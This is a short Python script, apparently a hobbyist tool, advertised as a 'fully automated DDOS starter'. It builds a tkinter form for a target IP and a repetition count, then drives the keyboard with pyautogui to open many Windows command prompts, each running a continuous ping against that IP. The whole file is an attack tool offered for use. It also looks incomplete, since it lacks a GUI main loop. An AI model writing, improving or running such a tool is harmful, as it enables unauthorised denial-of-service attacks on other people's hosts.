# Hydra GUI v1.3b
# A fully automated DDOS starter for Python


import pyautogui     # Make sure you have me! If not, do pip install pyautogui
import time
import tkinter

gui = tkinter.Tk()
gui.title("Blizzard")
gui.geometry("500x500")

label_ip = tkinter.Label(gui, text="IP to DDOS: ")
label_ip.pack()
ip = tkinter.Entry(gui)
ip.pack()
label_reps = tkinter.Label(gui, text="Repetitions: ")
label_reps.pack()
reps = tkinter.Entry(gui)
reps.pack()
done = tkinter.Button(gui, text="Start", command= lambda : do(ip.get(), reps.get()))
done.pack()

def do(IP_TO_DDOS, CMDS_TO_OPEN):
    
    commandString = str("ping " + IP_TO_DDOS + " -t")
    
    for i in range(int(CMDS_TO_OPEN)):
        
        pyautogui.hotkey("winleft", "r")
        
        pyautogui.typewrite("cmd")
        pyautogui.press("enter")
        
        time.sleep(0.2)
        
        pyautogui.typewrite(commandString)
            
        pyautogui.press("enter")



